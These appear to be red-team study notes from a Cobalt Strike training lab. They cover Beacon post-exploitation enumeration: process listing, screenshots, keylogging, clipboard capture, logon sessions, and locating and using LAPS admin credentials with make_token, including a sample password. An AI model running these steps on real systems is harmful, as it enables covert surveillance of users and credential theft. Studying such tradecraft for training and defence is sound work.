[[Seatbelt#Host Enumeration]]


## Processes

---

```
beacon> ps

[*] This Beacon PID:    YELLOW 7480  
 PID   PPID  Name                                   Arch  Session     User
 ---   ----  ----                                   ----  -------     ----
 0     0     [System Process]                                         
 4     0         System                                               
 88    4             Registry                                         
 364   4             smss.exe                                         
 1532  4             Memory Compression                               
 464   456   csrss.exe                                                
 540   532   csrss.exe                                                
 564   456   wininit.exe                                              
 680   564       services.exe                                         
 448   680           svchost.exe                                      
 2812  448               taskhostw.exe              x64   2           DEV\bfarmer
 4632  448               mmc.exe                                      
 4796  448               sihost.exe                 x64   2           DEV\bfarmer
 6048  448               taskhostw.exe              x64   2           DEV\bfarmer
 7896  448               powershell.exe             x64   2           DEV\bfarmer
 2252  7896                  conhost.exe            x64   2           DEV\bfarmer
 8088  7896                  powershell.exe         x64   2           DEV\bfarmer
 **snipped**
```

Look for processes running in medium integrity (i.e. a standard user). The indentation represents parent/child relationships.


## Screenshots

---

```
printscreen               Take a single screenshot via PrintScr method
screenshot                Take a single screenshot
screenwatch               Take periodic screenshots of desktop
```

`View > Screenshots`

## Keylogger

---

```
keylogger
```

`View > Keystrokes`

```
jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 6    0     keystroke logger

jobkill 6
```

## Clipboard

---

```
clipboard
```
Does not run as a job.


## User Sessions

---

```
net logons
```


## LAPS

---

There are a few methods to hunt for the presence of LAPS.  If it's applied to a machine that you have access to, AdmPwd.dll will be on disk.

```
beacon> ls C:\Program Files\LAPS\CSE
```

We could also search for GPOs that have "LAPS" or some other descriptive term in the name.

[[PowerView#Get-DomainGPO#Keyword]]

As well as computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property).

[[PowerView#Get-DomainComputer#Keyword]]

If we locate the correct GPO, we can download the LAPS configuration from the gpcfilesyspath.

```
beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine
```

```
beacon> download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine\Registry.pol
```

The `Parse-PolFile` cmdlet from the [GPRegistryPolicyParser](https://github.com/PowerShell/GPRegistryPolicyParser) package can be used to convert this file into human-readable format.

```
PS C:\Users\Attacker> Parse-PolFile .\Desktop\Registry.pol
```

For exploitation refer to [[Credential Theft#LAPS ms-Mcs-AdmPwd]]

The `make_token` command is an easy way to leverage it.

```
beacon> make_token .\LapsAdmin 1N3FyjJR5L18za
[+] Impersonated DEV\bfarmer
```